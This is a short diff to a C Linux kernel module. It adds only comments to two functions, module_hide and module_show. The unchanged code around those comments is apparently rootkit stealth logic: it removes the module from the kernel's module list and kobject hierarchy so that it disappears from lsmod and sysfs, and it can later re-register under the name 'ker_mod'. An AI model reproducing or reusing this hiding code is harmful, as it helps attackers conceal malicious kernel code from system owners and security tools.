@@ -57,7 +57,9 @@ static int temp;
 static char desc[50];
 
 void module_hide(void) {
+		/* The module is already hidden, do nothing. */
 		if(module_hidden) return;
+
 		module_previous = THIS_MODULE->list.prev;
 		list_del(&THIS_MODULE->list);
 		module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
@@ -69,7 +71,9 @@ void module_hide(void) {
 
 void module_show(void) {
 		int result;
+		/* The module is not hidden yet, nothing more to show. */
 		if(!module_hidden) return;
+
 		list_add(&THIS_MODULE->list, module_previous);
 		result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "ker_mod");
 		module_hidden = !module_hidden;
